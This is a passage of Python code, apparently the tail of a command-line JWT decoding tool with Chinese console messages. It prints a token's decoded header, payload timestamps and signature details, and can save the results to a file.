            decoded = jwt_tool.decode_jwt(token)
            
            if not args.quiet:
                print("\n" + "="*80)
                print("JWT 解码结果")
                print("="*80)
                
                if 'error' in decoded:
                    print(f"❌ 错误: {decoded['error']}")
                else:
                    # 显示原始Token
                    print(f"\n🎯 原始Token:")
                    print(f"  {token}")
                    
                    # Header
                    print(f"\n📋 HEADER:")
                    print(f"  原始 (Base64): {decoded['parts']['header']}")
                    header = decoded.get('header', {})
                    if 'json' in header and header['json']:
                        print(f"  解码后:")
                        for key, value in header['json'].items():
                            print(f"    {key}: {value}")
                    
                    # Payload  
                    print(f"\n📦 PAYLOAD:")
                    print(f"  原始 (Base64): {decoded['parts']['payload']}")
                    payload = decoded.get('payload', {})
                    if 'json' in payload and payload['json']:
                        print(f"  解码后:")
                        for key, value in payload['json'].items():
                            if key in ['exp', 'iat', 'nbf'] and isinstance(value, int):
                                try:
                                    dt = datetime.fromtimestamp(value)
                                    print(f"    {key}: {value} ({dt.strftime('%Y-%m-%d %H:%M:%S')})")
                                except:
                                    print(f"    {key}: {value}")
                            else:
                                print(f"    {key}: {value}")
                    
                    # Signature
                    print(f"\n🔐 SIGNATURE:")
                    signature = decoded.get('signature', {})
                    print(f"  原始 (Base64): {signature.get('encoded', 'N/A')}")
                    print(f"  长度: {signature.get('length', 0)} 字符")
                    print(f"  是否为空: {'是' if signature.get('is_empty') else '否'}")
                    
                    # PWD结构分析
                    print(f"\n🔍 PWD结构分析:")
                    print(f"  Header.Payload.Signature")
                    print(f"  {len(decoded['parts']['header'])}.{len(decoded['parts']['payload'])}.{len(decoded['parts']['signature'])} (字符数)")
            
            if args.output:
                jwt_tool.save_results(decoded, args.output, args.format)
    
    return 0


if __name__ == "__main__":
    try:
        exit_code = main()
        sys.exit(exit_code)
    except KeyboardInterrupt:
        print("\n[!] 用户中断")
        sys.exit(1)
    except Exception as e:
        print(f"[-] 程序错误: {e}")
        sys.exit(1)
